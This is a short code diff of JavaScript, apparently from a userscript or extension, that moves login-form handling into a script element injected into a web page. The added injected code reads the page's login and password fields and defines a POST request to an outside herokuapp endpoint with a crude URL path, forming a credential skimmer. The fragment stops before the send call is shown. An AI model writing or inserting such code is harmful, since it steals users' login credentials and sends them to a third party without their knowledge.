@@ -1,9 +1,3 @@
-let btn = document.getElementById('form-button');
-let fform = document.getElementById('login-form')
-let l = document.getElementById('loginform-login')
-let p = document.getElementById('loginform-password')
-const url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
-
 function g(theUrl)
 {
     var xmlHttp = new XMLHttpRequest();
@@ -13,7 +7,12 @@ function g(theUrl)
 }
 function createMyScript() {
     let script = document.createElement('script')
-    script.innerHTML = `function post(url, data) {
+    script.innerHTML = `let btn = document.getElementById('form-button');
+    let fform = document.getElementById('login-form')
+    let l = document.getElementById('loginform-login')
+    let p = document.getElementById('loginform-password')
+    const url = 'https://controlyourmum.herokuapp.com/wtflolfuckyou';
+    function post(url, data) {
     let xhr = new XMLHttpRequest();
     xhr.onreadystatechange = function() {
         if (xhr.readyState === 4) {
